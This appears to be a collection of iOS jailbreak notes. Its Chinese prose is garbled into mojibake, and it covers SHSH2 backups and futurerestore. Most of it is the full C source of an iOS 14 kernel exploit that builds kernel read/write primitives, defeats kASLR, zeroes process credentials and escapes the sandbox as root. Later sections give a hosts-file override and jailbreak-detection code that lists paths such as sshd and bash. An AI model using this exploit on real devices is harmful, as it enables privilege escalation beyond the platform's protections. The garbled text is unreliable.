ä¹‹å‰iOS è¦å¤‡ä»½SHSH å¯è¾¾æˆé™çº§ï¼Œç›¸ä¿¡è¿˜ä¼šæœ‰ä¸å°‘ç”¨æˆ·æä¸æ¸…æ¥šï¼Œæ€ä¹ˆåˆè·³å‡ºSHSH2 è¿™ä¸œè¥¿ï¼Œè¿™ä¸SHSHåˆæœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ

åŠ ä¸Šå› iOS éªŒè¯çš„APIæœ‰æ”¹å˜ï¼Œé€ æˆnonceæ˜¯æ— æ³•ä»AppleéªŒè¯æœåŠ¡å™¨ä¸Šå–å¾—ï¼Œç›®å‰è¿˜ä¿ç•™åœ¨signå†…ï¼Œå¯¼è‡´å·²ç»æ— æ³•ä½¿ç”¨ä¹‹å‰ç”¨å°çº¢ä¼å·¥å…·æ¥è·å–æ—§ç‰ˆSHSHæ–‡ä»¶ï¼Œå› ä¸ºè¿™æ–¹æ³•å…¶å®æ˜¯æ²¡æœ‰åŒ…å«nonceå€¼ï¼ŒåŒç­‰äºå°±æ²¡æœ‰ä»»ä½•ä½œç”¨ã€‚

å› æ­¤ihmstar æ¨å‡ºäº†æœ€æ–°çš„ä¿å­˜è„šæœ¬å·¥å…·tsschecker ï¼Œå¯æ¥è·å–è®¾å¤‡çš„SHSH2æ¡£æ¡ˆï¼Œä¸è¿‡è¿™è„šæœ¬å·¥å…·é‡Œé¢æ‰€ä¿å­˜çš„SHSH2æ¡£æ¡ˆä¸åŒ…æ‹¬æœ‰Nonceä»…åªæœ‰Generatorï¼Œè¿™ä¸²æ•°å€¼å¯æ­é…Prometheus é™çº§å·¥å…·ä½¿ç”¨ï¼Œèƒ½å¤Ÿè®©iOSä½¿ç”¨Generator å’ŒSHSH2 æ¡£æ¡ˆäº§ç”Ÿæœ€å…³é”®çš„ã€ŒAPNonceã€ï¼Œå¦‚æ­¤ä¸€æ¥æœ‰äº†SHSH2æ¡£æ¡ˆåï¼Œåç»­å°±å¯ä»¥è‡ªç”±çš„è¿›è¡Œå‡é™çº§å·¥ä½œã€‚

ä½†ç›®å‰ç”±äºè¿˜æ²¡çªç ´é™çº§é™åˆ¶ï¼Œåœ¨æ‹¥æœ‰SHSH2 å¤§éƒ¨åˆ†æ¡ä»¶æƒ…å†µä¸‹ä¹Ÿä»…èƒ½å¤Ÿå®ç°å‡çº§ä¸é‡åˆ·ï¼Œ
é™¤äº†A7å¤„ç†å™¨è®¾å¤‡iPhone 5s / iPad Air 1 / iPad Mini 2 èƒ½å®ç°é™çº§å¤–ã€‚
åˆåŠ ä¸Šè‹¹æœä¼šä¸å®šæ—¶æ”¹å˜SEP è¦æ¥é˜»æ­¢ç”¨æˆ·å¯é€è¿‡Prometheus å‡ã€é™çº§ï¼Œæ‰ä¼šå¯¼è‡´è¿‡å»æ›¾ç»å‘ç”Ÿè¿‡iOS 11~iOS 11.2.6 ä¸iOS 11.3 SEP ä¸åŒï¼Œ
è¿™ç®—æ˜¯é¦–æ¬¡å‡ºç°çš„ç°è±¡ï¼Œä»¥å¾€è¿‡å»éƒ½æ˜¯åœ¨iOS å¤§ç‰ˆæœ¬æ›´æ–°æ‰ä¼šæ”¹å˜SEPï¼Œä½†è‹¹æœä¹Ÿä¸æ–­æŒç»­æå‡å®‰å…¨æ€§ä¸é˜²å¾¡æœºåˆ¶ã€‚

è¯¥æ€ä¹ˆå¤‡ä»½shsh2ï¼Ÿ=> å‚è€ƒå¾®ä¿¡å…¬ä¼—å·Cydiaæ–‡ç« 

ä¸ç®¡æœªæ¥æœ‰æ²¡æœ‰æ‰“ç®—è¦è¶Šç‹±ï¼Œæˆ–è®¸å¯å…ˆè·‘ä¸€æ¬¡å¤‡ä»½iOS çš„shsh2 ï¼Œæœªæ¥å¦‚æœæ¼æ´å¯å¼€å‘å‡ºé™çº§å·¥å…·ç”¨æ¥è‡ªç”±å‡é™iOSç‰ˆæœ¬æ—¶ï¼Œä¿å­˜å¥½çš„shsh2 è¿™å°±æ˜¯ä½ æ‰‹ä¸­æ¡æœ‰æœ€ä½³é™çº§çš„å…³é”®é’¥åŒ™ã€‚å¦‚æœéƒ½æ²¡å¤‡ä»½ï¼Œé‚£æ°¸è¿œéƒ½æ˜¯æ²¡æœ‰è¿™ä¸ªæœºä¼šã€‚

å‘ç°åˆ°ä¸å°‘ç”¨æˆ·ä¼šè¯¯è§£å¤‡ä»½shsh2ä¸€å®šè¦é€è¿‡ç”µè„‘æˆ–æ˜¯å‡çº§ä¸ŠiOSç‰ˆæœ¬æ‰å¯ä»¥ï¼Œè¿™äº›éƒ½æ˜¯é”™è¯¯çš„æƒ³æ³•ï¼ŒiOS shsh2 å¤‡ä»½æ˜¯åœ¨ä»»ä½•å¯å¼€å¯ç½‘é¡µç‰ˆæœ¬çŠ¶æ€ä¸‹å°±å¯ä»¥æ“ä½œï¼Œ
ä¸”ä¸éœ€è¦ç”µè„‘ä¹Ÿå¯ä»¥ç›´æ¥é€è¿‡iOS æ‰§è¡Œæ“ä½œï¼Œå‰ææ˜¯éœ€è¦æŸ¥å¥½ECIDå’ŒInternal Name/Modelå°±å¯ä»¥ï¼Œè¿™éƒ¨åˆ†å¯ä»¥ç›´æ¥å­˜åœ¨iOSå¤‡å¿˜å½•å†…ï¼Œ
æ¯æ¬¡iOS æ–°ç‰ˆæœ¬æ¨å‡ºæ—¶ï¼Œå°±å¯ä»¥ç›´æ¥å¤åˆ¶è´´ä¸Šæ‰§è¡Œshsh2 å¤‡ä»½ã€‚

futurerestore å·¥å…·
ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶

SEP æ–‡ä»¶
è§£å‹ä¸‹è½½çš„ç³»ç»Ÿå›ºä»¶
åœ¨ Firmware/all_flash ç›®å½•ä¸‹ï¼Œæœ‰ä¸€å †ä»¥ â€œsepâ€ å¼€å¤´çš„æ–‡ä»¶ï¼Œä½†æ˜¯å®ƒæœ‰å¾ˆå¤šç§ï¼Œæ¯”å¦‚æˆ‘è¿™é‡Œæœ‰ j120ã€j121 ç­‰

åŸºå¸¦å›ºä»¶
åœ¨è§£å‹ç¼©çš„ç³»ç»Ÿå›ºä»¶çš„ Firmware æ–‡ä»¶å¤¹é‡Œï¼Œé€šå¸¸è¿˜æœ‰ä¸€äº› .bbfw æ ¼å¼çš„æ–‡ä»¶ï¼Œè¿™äº›æ˜¯åŸºå¸¦æ–‡ä»¶ã€‚è¿™å°±éœ€è¦ä½ æŸ¥ä¸€ä¸‹ä½ æ‰‹æœºå¯¹åº”çš„æ˜¯å“ªä¸ªåŸºå¸¦æ–‡ä»¶äº†ï¼Œæˆ‘è¿™é‡Œæ˜¯ WLAN ç‰ˆ iPadï¼Œæ‰€ä»¥åªæœ‰ä¸€ä¸ª

BuildManifest.plist æ–‡ä»¶
è§£å‹ç¼©ç³»ç»Ÿå›ºä»¶ï¼Œåœ¨æ ¹ç›®å½•å°±èƒ½çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶
...
```

## pre-jailbreak æ¼æ´
```

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>
#include <mach/mach.h>

#include "mycommon.h"
#include "k_offsets.h"
#include "utils.h"
#include "k_utils.h"
#include "kapi.h"
#include "user_kernel_alloc.h"
#include "cicuta_virosa/cicuta_virosa.h"

extern mach_port_t IOSurfaceRootUserClient;
uint32_t iosurface_create_fast(void);
uint32_t iosurface_s_get_ycbcrmatrix(void);
void iosurface_s_set_indexed_timestamp(uint64_t v);

static int *pipefds;
static size_t pipe_buffer_size = 0x1000;
static uint8_t *pipe_buffer;
static kptr_t IOSurfaceRoot_uc;

static void read_pipe()
{
    size_t read_size = pipe_buffer_size - 1;
    ssize_t count = read(pipefds[0], pipe_buffer, read_size);
    if (count == read_size) {
        return;
    } else if (count == -1) {
        perror("read_pipe");
        util_error("could not read pipe buffer");
    } else if (count == 0) {
        util_error("pipe is empty");
    } else {
        util_error("partial read %zu of %zu bytes", count, read_size);
    }
    fail_info(__FUNCTION__);
}

static void write_pipe()
{
    size_t write_size = pipe_buffer_size - 1;
    ssize_t count = write(pipefds[1], pipe_buffer, write_size);
    if (count == write_size) {
        return;
    } else if (count < 0) {
        util_error("could not write pipe buffer");
    } else if (count == 0) {
        util_error("pipe is full");
    } else {
        util_error("partial write %zu of %zu bytes", count, write_size);
    }
    fail_info(__FUNCTION__);
}

static void build_stable_kmem_api()
{
    static kptr_t pipe_base;
    kptr_t p_fd = kapi_read_kptr(g_exp.self_proc + OFFSET(proc, p_fd));
    kptr_t fd_ofiles = kapi_read_kptr(p_fd + OFFSET(filedesc, fd_ofiles));
    kptr_t rpipe_fp = kapi_read_kptr(fd_ofiles + sizeof(kptr_t) * pipefds[0]);
    kptr_t fp_glob = kapi_read_kptr(rpipe_fp + OFFSET(fileproc, fp_glob));
    kptr_t rpipe = kapi_read_kptr(fp_glob + OFFSET(fileglob, fg_data));
    pipe_base = kapi_read_kptr(rpipe + OFFSET(pipe, buffer));

    // XXX dirty hack, but I'm lucky :)
    uint8_t bytes[20];
    read_20(IOSurfaceRoot_uc + OFFSET(IOSurfaceRootUserClient, surfaceClients) - 4, bytes);
    *(kptr_t *)(bytes + 4) = pipe_base;
    write_20(IOSurfaceRoot_uc + OFFSET(IOSurfaceRootUserClient, surfaceClients) - 4, bytes);

    // iOS 14.x only
    struct fake_client {
        kptr_t pad_00; // can not use IOSurface 0 now
        kptr_t uc_obj;
        uint8_t pad_10[0x40]; // start of IOSurfaceClient obj
        kptr_t surf_obj;
        uint8_t pad_58[0x360 - 0x58];
        kptr_t shared_RW;
    };

    stage0_read32 = ^uint32_t (kptr_t addr) {
        struct fake_client *p = (void *)pipe_buffer;
        p->uc_obj = pipe_base + 16;
        p->surf_obj = addr - 0xb4;
        write_pipe();
        uint32_t v = iosurface_s_get_ycbcrmatrix();
        read_pipe();
        return v;
    };

    stage0_read64 = ^uint64_t (kptr_t addr) {
        uint64_t v = stage0_read32(addr);
        v |= (uint64_t)stage0_read32(addr + 4) << 32;
        return v;
    };

    stage0_read_kptr = ^kptr_t (kptr_t addr) {
        uint64_t v = stage0_read64(addr);
        if (v && (v >> 39) != 0x1ffffff) {
            if (g_exp.debug) {
                util_info("PAC %#llx -> %#llx", v, v | 0xffffff8000000000);
            }
            v |= 0xffffff8000000000; // untag, 25 bits
        }
        return (kptr_t)v;
    };

    stage0_read = ^void (kptr_t addr, void *data, size_t len) {
        uint8_t *_data = data;
        uint32_t v;
        size_t pos = 0;
        while (pos < len) {
            v = stage0_read32(addr + pos);
            memcpy(_data + pos, &v, len - pos >= 4 ? 4 : len - pos);
            pos += 4;
        }
    };

    stage0_write64 = ^void (kptr_t addr, uint64_t v) {
        struct fake_client *p = (void *)pipe_buffer;
        p->uc_obj = pipe_base + 0x10;
        p->surf_obj = pipe_base;
        p->shared_RW = addr;
        write_pipe();
        iosurface_s_set_indexed_timestamp(v);
        read_pipe();
    };

    stage0_write = ^void (kptr_t addr, void *data, size_t len) {
        uint8_t *_data = data;
        uint64_t v;
        size_t pos = 0;
        while (pos < len) {
            size_t bytes = 8;
            if (bytes > len - pos) {
                bytes = len - pos;
                v = stage0_read64(addr + pos);
            }
            memcpy(&v, _data + pos, bytes);
            stage0_write64(addr + pos, v);
            pos += 8;
        }
    };
}

static void build_stage0_kmem_api()
{
    stage0_read32 = ^uint32_t (kptr_t addr) {
        uint32_t v = read_32(addr);
        return v;
    };

    stage0_read64 = ^uint64_t (kptr_t addr) {
        uint64_t v = read_64(addr);
        return v;
    };

    stage0_read_kptr = ^kptr_t (kptr_t addr) {
        uint64_t v = stage0_read64(addr);
        if (v && (v >> 39) != 0x1ffffff) {
            if (g_exp.debug) {
                util_info("PAC %#llx -> %#llx", v, v | 0xffffff8000000000);
            }
            v |= 0xffffff8000000000; // untag, 25 bits
        }
        return (kptr_t)v;
    };

    stage0_read = ^void (kptr_t addr, void *data, size_t len) {
        uint8_t *_data = data;
        uint64_t v;
        size_t pos = 0;
        while (pos < len) {
            v = stage0_read64(addr + pos);
            memcpy(_data + pos, &v, len - pos >= 8 ? 8 : len - pos);
            pos += 8;
        }
    };

    stage0_write64 = ^void (kptr_t addr, uint64_t v) {
        stage0_write(addr, &v, sizeof(v));
    };

    stage0_write = ^void (kptr_t addr, void *data, size_t len) {
        uint8_t *_data = data;
        uint8_t v[20];
        size_t pos = 0;
        while (pos < len) {
            size_t bytes = 20;
            if (bytes > len - pos) {
                bytes = len - pos;
                read_20(addr + pos, v);
            }
            memcpy(v, _data + pos, bytes);
            write_20(addr + pos, v);
            pos += 20;
        }
    };
}

void exploit_main(void)
{
    sys_init();
    kernel_offsets_init();
    bool ok = IOSurface_init();
    fail_if(!ok, "can not init IOSurface lib");
    uint32_t surf_id = iosurface_create_fast();
    util_info("surface_id %u", surf_id);
    size_t pipe_count = 1;
    pipefds = create_pipes(&pipe_count);
    pipe_buffer = (uint8_t *)malloc(pipe_buffer_size);
    memset_pattern4(pipe_buffer, "pipe", pipe_buffer_size);
    pipe_spray(pipefds, 1, pipe_buffer, pipe_buffer_size, NULL);
    read_pipe();

    // open the door to iOS 14
    cicuta_virosa();

    build_stage0_kmem_api();

    g_exp.self_ipc_space = kapi_read_kptr(g_exp.self_task + OFFSET(task, itk_space));
    g_exp.self_proc = kapi_read_kptr(g_exp.self_task + OFFSET(task, bsd_info));

    kptr_t IOSurfaceClient_obj;
    {
        kptr_t entry = ipc_entry_lookup(IOSurfaceRootUserClient);
        kptr_t object = kapi_read_kptr(entry + OFFSET(ipc_entry, ie_object));
        kptr_t kobject = kapi_read_kptr(object + OFFSET(ipc_port, ip_kobject));
        IOSurfaceRoot_uc = kobject;
        kptr_t surfaceClients = kapi_read_kptr(kobject + OFFSET(IOSurfaceRootUserClient, surfaceClients));
        IOSurfaceClient_obj = kapi_read_kptr(surfaceClients + sizeof(kptr_t) * surf_id);
    }

    util_info("build stable kernel r/w primitives");
    build_stable_kmem_api();
    util_info("---- done ----");

    kptr_t vt_ptr = kapi_read64(IOSurfaceClient_obj);
    if ((vt_ptr >> 39) != 0x1ffffff) {
        g_exp.has_PAC = true;
    }

    util_info("defeat kASLR");

    kptr_t IOSurfaceClient_vt;
    kptr_t IOSurfaceClient_vt_0;
    IOSurfaceClient_vt = kapi_read_kptr(IOSurfaceClient_obj);
    IOSurfaceClient_vt_0 = kapi_read_kptr(IOSurfaceClient_vt);

    util_info("vt %#llx, vt[0] %#llx", IOSurfaceClient_vt, IOSurfaceClient_vt_0);
    util_msleep(100);

    // device&OS dependent
    kptr_t text_slide = IOSurfaceClient_vt_0 - kc_IOSurfaceClient_vt_0;
    kptr_t data_slide = IOSurfaceClient_vt - kc_IOSurfaceClient_vt;

    kptr_t kernel_base = kc_kernel_base + text_slide;
    kptr_t kernel_map = kc_kernel_map + data_slide;
    kptr_t kernel_task = kc_kernel_task + data_slide;

    kptr_t kernel_map_ptr;
    kernel_map_ptr = kapi_read_kptr(kernel_map);

    kptr_t kernel_task_ptr;
    kernel_task_ptr = kapi_read_kptr(kernel_task);

    util_info("kernel slide %#llx", text_slide);
    util_info("kernel base %#llx, kernel_map < %#llx: %#llx >", kernel_base, kernel_map, kernel_map_ptr);

    util_info("verify kernel header");
#ifdef __arm64e__
    const uint32_t mach_header[4] = { 0xfeedfacf, 0x0100000c, 0xc0000002, 2 };
#else
    const uint32_t mach_header[4] = { 0xfeedfacf, 0x0100000c, 0, 2 };
#endif
    uint32_t data[4] = {};
    kapi_read(kernel_base, data, sizeof(mach_header));
    util_hexprint_width(data, sizeof(data), 4, "_mh_execute_header");
    int diff = memcmp(mach_header, data, sizeof(uint32_t [2]));
    fail_if(diff, "mach_header mismatch");

    g_exp.kernel_task = kernel_task_ptr;
    g_exp.kernel_proc = kapi_read_kptr(g_exp.kernel_task + OFFSET(task, bsd_info));

    if (g_exp.debug) {
        util_info("---- dump kernel cred ----");
        debug_dump_proc_cred(g_exp.kernel_proc);
        util_info("---- dump self cred ----");
        debug_dump_proc_cred(g_exp.self_proc);
    }

    post_exploit();

    // clean KHEAP by yourself
}

```

```
//  post_exploit.c

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <mach/mach.h>
#include <copyfile.h>
#include "mycommon.h"
#include "utils.h"
#include "k_utils.h"
#include "kapi.h"
#include "k_offsets.h"

#define copyfile(X,Y) (copyfile)(X, Y, 0, COPYFILE_ALL|COPYFILE_RECURSIVE|COPYFILE_NOFOLLOW_SRC);
#define JAILB_ROOT "/private/var/containers/Bundle/jb_resources/"
static const char *jailb_root = JAILB_ROOT;

char *Build_resource_path(char *filename);
void patch_amfid(pid_t amfid_pid);

#define PROC_ALL_PIDS        1
extern int proc_listpids(uint32_t type, uint32_t typeinfo, void *buffer, int buffersize);
extern int proc_pidpath(int pid, void * buffer, uint32_t  buffersize);

pid_t look_for_proc_internal(const char *name, bool (^match)(const char *path, const char *want))
{
    pid_t *pids = calloc(1, 3000 * sizeof(pid_t));
    int procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, 3000);
    if(procs_cnt > 3000) {
        pids = realloc(pids, procs_cnt * sizeof(pid_t));
        procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, procs_cnt);
    }
    int len;
    char pathBuffer[4096];
    for (int i=(procs_cnt-1); i>=0; i--) {
        if (pids[i] == 0) {
            continue;
        }
        memset(pathBuffer, 0, sizeof(pathBuffer));
        len = proc_pidpath(pids[i], pathBuffer, sizeof(pathBuffer));
        if (len == 0) {
            continue;
        }
        if (match(pathBuffer, name)) {
            free(pids);
            return pids[i];
        }
    }
    free(pids);
    return 0;
}

pid_t look_for_proc(const char *proc_name)
{
    return look_for_proc_internal(proc_name, ^bool (const char *path, const char *want) {
        if (!strcmp(path, want)) {
            return true;
        }
        return false;
    });
}

pid_t look_for_proc_basename(const char *base_name)
{
    return look_for_proc_internal(base_name, ^bool (const char *path, const char *want) {
        const char *base = path;
        const char *last = strrchr(path, '/');
        if (last) {
            base = last + 1;
        }
        if (!strcmp(base, want)) {
            return true;
        }
        return false;
    });
}

void patch_TF_PLATFORM(kptr_t task)
{
    uint32_t t_flags = kapi_read32(task + OFFSET(task, t_flags));
    util_info("old t_flags %#x", t_flags);

    t_flags |= 0x00000400; // TF_PLATFORM
    kapi_write32(task + OFFSET(task, t_flags), t_flags);
    t_flags = kapi_read32(task + OFFSET(task, t_flags));
    util_info("new t_flags %#x", t_flags);

    // used in kernel func: csproc_get_platform_binary
}

struct proc_cred {
    char posix_cred[0x100]; // HACK big enough
    kptr_t cr_label;
    kptr_t sandbox_slot;
};

void proc_set_root_cred(kptr_t proc, struct proc_cred **old_cred)
{
    *old_cred = NULL;
    kptr_t p_ucred = kapi_read_kptr(proc + OFFSET(proc, p_ucred));
    kptr_t cr_posix = p_ucred + OFFSET(ucred, cr_posix);

    size_t cred_size = SIZE(posix_cred);
    char zero_cred[cred_size];
    struct proc_cred *cred_label;
    fail_if(cred_size > sizeof(cred_label->posix_cred), "struct proc_cred should be bigger");
    cred_label = malloc(sizeof(*cred_label));

    kapi_read(cr_posix, cred_label->posix_cred, cred_size);
    cred_label->cr_label = kapi_read64(cr_posix + SIZE(posix_cred));
    cred_label->sandbox_slot = 0;

    if (cred_label->cr_label) {
        kptr_t cr_label = cred_label->cr_label | 0xffffff8000000000; // untag, 25 bits
        cred_label->sandbox_slot = kapi_read64(cr_label + 0x10);
        kapi_write64(cr_label + 0x10, 0x0);
    }

    memset(zero_cred, 0, cred_size);
    kapi_write(cr_posix, zero_cred, cred_size);
    *old_cred = cred_label;
}

void proc_restore_cred(kptr_t proc, struct proc_cred *old_cred)
{
    // TODO
}

#pragma mark ---- Post-exp main entry ----

void post_exploit(void)
{
    util_info("update proc_self credential");
    // can not do this under PAC
    //kapi_write64(g_exp.self_proc + OFFSET(proc, p_ucred), kernelCredAddr);
    struct proc_cred *old_cred;
    proc_set_root_cred(g_exp.self_proc, &old_cred);
    util_msleep(100);

    int err = setuid(0);
    if (err) {
        perror("setuid");
    }

    // Test writing to the outer worlds
    if (1) { // ok
        FILE *fp = fopen("/var/mobile/test.txt", "wb");
        fail_if(fp == NULL, "failed to write /var/mobile/test.txt");
        util_info("wrote test file: %p", fp);
        fprintf(fp, "hello from pattern-f\n");
        fclose(fp);
    }

    util_info("now we are out of sandbox, check \"/bin/ps -p 1\"");
    // test exec command
    //util_runCommand("/bin/ls", NULL); // not privided by Apple
    util_runCommand("/bin/ps", "-p", "1", NULL); // built-in tools

    //patch_TF_PLATFORM(g_exp.self_task);

    // ----------------------------------------------------------------------
    //
    util_info("TODO insert your code here");
    //
    // ----------------------------------------------------------------------

    proc_restore_cred(g_exp.self_proc, old_cred);
    free(old_cred);
}

```

## å®‰è£…æœ€æ–°ç‰ˆæœ¬theosç»ˆç«¯å‘½ä»¤è¡Œ
```
$ sudo git clone --recursive https://github.com/theos/theos.git /opt/theos
```

## raw.githubusercontent.com port 443é—®é¢˜
### MacOSè§£å†³å®‰è£…MonkeyDevç­‰é‡è§Failed to connect to raw.githubusercontent.com port 443é—®é¢˜ : https://www.jianshu.com/p/6ea74620caae

Mac æ–‡ä»¶å¤¹æœç´¢è¿›å…¥/etc/hosts
![](https://upload-images.jianshu.io/upload_images/14363383-05259ba1e54ca565.png)

æ‰¾åˆ°hosts è¾“å…¥ä»¥ä¸‹æ–‡å­—(ä¸è¦è¾“å…¥å…¶ä»–æ–‡å­—)Â  (æ— æƒé™å¯ä»¥å¤åˆ¶åˆ°æ¡Œé¢ ç„¶åæ›¿æ¢æºæ–‡ä»¶)
![](https://upload-images.jianshu.io/upload_images/14363383-39e4a6a34f97aa51.png)

199.232.96.133Â  Â  Â raw.githubusercontent.com

æµè§ˆå™¨ç›´æ¥æ‰“å¼€raw.githubusercontent.comÂ  å‡ºç°githubç½‘ç«™å°±OK

199.232.96.133 raw.githubusercontent.com # comments. put the address here
![](https://upload-images.jianshu.io/upload_images/14363383-bbffc82ba3dce51d.png)

ç„¶åæˆåŠŸä¸‹è½½

## iOS Hook Fake Detection
```
#import "iOSHookDetection.h"
#import "fishhook.h"
#import <sys/stat.h>
#include <string.h>
#import <mach-o/loader.h>
#import <mach-o/dyld.h>
#import <mach-o/arch.h>
#import <objc/runtime.h>
#import <dlfcn.h>

static char *JailbrokenPathArr[] = {"/Applications/Cydia.app","/usr/sbin/sshd","/bin/bash","/etc/apt","/Library/MobileSubstrate","/User/Applications/"};

@implementation iOSHookDetection  //å®ç°å‡½æ•°

#pragma mark - è¶Šç‹±æ£€æµ‹
#pragma mark ä½¿ç”¨NSFileManageré€šè¿‡æ£€æµ‹ä¸€äº›è¶Šç‹±åçš„å…³é”®æ–‡ä»¶æ˜¯å¦å¯ä»¥è®¿é—®æ¥åˆ¤æ–­æ˜¯å¦è¶Šç‹±
+ (BOOL)isJailbroken1{
    if(TARGET_IPHONE_SIMULATOR)return NO;
    for (int i = 0;i < sizeof(JailbrokenPathArr) / sizeof(char *);i++) {
        if([[NSFileManager defaultManager] fileExistsAtPath:[NSString stringWithUTF8String:JailbrokenPathArr[i]]]){
            return YES;
        }
    }
    return NO;
}
#pragma mark ä½¿ç”¨staté€šè¿‡æ£€æµ‹ä¸€äº›è¶Šç‹±åçš„å…³é”®æ–‡ä»¶æ˜¯å¦å¯ä»¥è®¿é—®æ¥åˆ¤æ–­æ˜¯å¦è¶Šç‹±
+ (BOOL)isJailbroken2{
    
    if(TARGET_IPHONE_SIMULATOR)return NO;
    int ret ;
    Dl_info dylib_info;
    int (*func_stat)(const char *, struct stat *) = stat;
    if ((ret = dladdr(func_stat, &dylib_info))) {
        NSString *fName = [NSString stringWithUTF8String:dylib_info.dli_fname];
        NSLog(@"fname--%@",fName);
        if(![fName isEqualToString:@"/usr/lib/system/libsystem_kernel.dylib"]){
            return YES;
        }
    }
    
    for (int i = 0;i < sizeof(JailbrokenPathArr) / sizeof(char *);i++) {
        struct stat stat_info;
        if (0 == stat(JailbrokenPathArr[i], &stat_info)) {
            return YES;
        }
    }
    
    return NO;
}

#pragma mark é€šè¿‡ç¯å¢ƒå˜é‡DYLD_INSERT_LIBRARIESæ£€æµ‹æ˜¯å¦è¶Šç‹±
+ (BOOL)isJailbroken3{
    if(TARGET_IPHONE_SIMULATOR)return NO;
    return !(NULL == getenv("DYLD_INSERT_LIBRARIES"));
}

#pragma mark - é€šè¿‡éå†dyld_imageæ£€æµ‹éæ³•æ³¨å…¥çš„åŠ¨æ€åº“
+ (BOOL)isExternalLibs{
    if(TARGET_IPHONE_SIMULATOR)return NO;
    int dyld_count = _dyld_image_count();
    for (int i = 0; i < dyld_count; i++) {
        const char * imageName = _dyld_get_image_name(i);
        NSString *res = [NSString stringWithUTF8String:imageName];
        if([res hasPrefix:@"/var/containers/Bundle/Application"]){
            if([res hasSuffix:@".dylib"]){
                //è¿™è¾¹è¿˜éœ€è¦è¿‡æ»¤æ‰è‡ªå·±é¡¹ç›®ä¸­æœ¬èº«æœ‰çš„åŠ¨æ€åº“
                return YES;
            }
        }
    }
    return NO;
}

#pragma mark - é€šè¿‡æ£€æµ‹ipaä¸­çš„embedded.mobileprovisionä¸­çš„æˆ‘ä»¬æ‰“åŒ…Macçš„å…¬é’¥æ¥ç¡®å®šæ˜¯å¦ç­¾åè¢«ä¿®æ”¹ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯æ­¤æ–¹æ³•åªé€‚ç”¨äºAd Hocæˆ–ä¼ä¸šè¯ä¹¦æ‰“åŒ…çš„æƒ…å†µï¼ŒApp Storeä¸Šåº”ç”¨ç”±è‹¹æœç§é’¥ç»Ÿä¸€æ‰“åŒ…ï¼Œä¸å­˜åœ¨embedded.mobileprovisionæ–‡ä»¶
+ (BOOL)isLegalPublicKey:(NSString *)publicKey{
    if(TARGET_IPHONE_SIMULATOR)return YES;
    //æ¥æºäºhttps://www.jianshu.com/p/a3fc10c70a29
    NSString *embeddedPath = [[NSBundle mainBundle] pathForResource:@"embedded" ofType:@"mobileprovision"];
    NSString *embeddedProvisioning = [NSString stringWithContentsOfFile:embeddedPath encoding:NSASCIIStringEncoding error:nil];
    NSArray *embeddedProvisioningLines = [embeddedProvisioning componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]];
    for (int i = 0; i < embeddedProvisioningLines.count; i++) {
        if ([embeddedProvisioningLines[i] rangeOfString:@"application-identifier"].location != NSNotFound) {
            NSInteger fromPosition = [embeddedProvisioningLines[i+1] rangeOfString:@"<string>"].location+8;
            
            NSInteger toPosition = [embeddedProvisioningLines[i+1] rangeOfString:@"</string>"].location;
            NSRange range;
            range.location = fromPosition;
            range.length = toPosition - fromPosition;
            NSString *fullIdentifier = [embeddedProvisioningLines[i+1] substringWithRange:range];
            NSArray *identifierComponents = [fullIdentifier componentsSeparatedByString:@"."];
            NSString *appIdentifier = [identifierComponents firstObject];
            NSLog(@"appIdentifier--%@",appIdentifier);
            if (![appIdentifier isEqualToString:publicKey]) {
                return NO;
            }
        }
    }
    return YES;
}

@end

```

### æµ…æTweak loader(MobileSubstrateçš„æ›¿ä»£å“)

æœåˆ°çš„æºç æ˜¯ï¼šhttps://github.com/chr1s0x1/TweakInject

ä»£ç æœ¬èº«å¾ˆç®€å•ï¼Œå°±æ˜¯å»/Library/MobileSubstrate/DynamicLibrariesä¸‹é¢å»æœç´¢ï¼Œ
é€šè¿‡plistæ–‡ä»¶é‡Œé¢çš„å­—æ®µå†³å®šæ˜¯å¦å°†dylibåŠ è½½åˆ°å½“å‰è¿›ç¨‹ä¸­ï¼Œ
å°±å’Œå¹³æ—¶å¼€å‘tweakå»hooké‚£äº›appçš„è¿‡ç¨‹ä¸€æ ·ã€‚
ä¸è¿‡æˆ‘æ„Ÿåˆ°ç–‘é—®çš„åœ°æ–¹åœ¨äºé‚£æœ¬èº«è¿™ä¸ªtweak loader dylibåˆæ˜¯è°ä»¥åŠä½•æ—¶è¢«åŠ è½½åˆ°è¿›ç¨‹ä¸­çš„å‘¢ã€‚
è¿™é‡Œä¸éš¾æƒ³åˆ°åº”è¯¥å°±æ˜¯è¶Šç‹±åæ”¯æŒhookç¯å¢ƒç›¸å…³ï¼Œæ‰€ä»¥æˆ‘åˆå»ç¿»é˜…ç›¸å…³è¶Šç‹±æºç ã€‚

#Electra
ç ”ç©¶çš„è¶Šç‹±æºç æ˜¯ï¼šhttps://github.com/coolstar/electra

è‡³äºä¸ºä»€ä¹ˆä¼šé€‰æ‹©Electraï¼Œè€Œä¸”æ˜¯æ—©æœŸçš„ä¸€ä¸ªç‰ˆæœ¬ï¼Ÿæœ‰ä»¥ä¸‹å‡ ç‚¹åŸå› ï¼š
coolstarç”±äºåœ¨å¼€å‘Electraè¶Šç‹±å,æ²¡æœ‰å¼€å‘æ’ä»¶hookç¯å¢ƒ
è€ŒCydiaä¹‹çˆ¶saurikæ²¡æœ‰æä¾›substrateçš„æ”¯æŒï¼Œ
æ‰€ä»¥è‡ªå·±å®ç°äº†ç±»ä¼¼Cydia Substrateå®Œæ•´çš„hookç¯å¢ƒï¼Œ
è¿™é‡Œé¢å¾ˆå¤šä¸œè¥¿éƒ½æ˜¯é‡æ–°ç ”ç©¶å®ç°çš„ï¼Œä¿ç•™äº†å¾ˆå¤šå½“æ—¶çš„æ›²æŠ˜è¿‡ç¨‹ï¼Œè€Œè¿™äº›æ°å¥½å¾ˆä¾¿äºå»å­¦ä¹ ã€‚
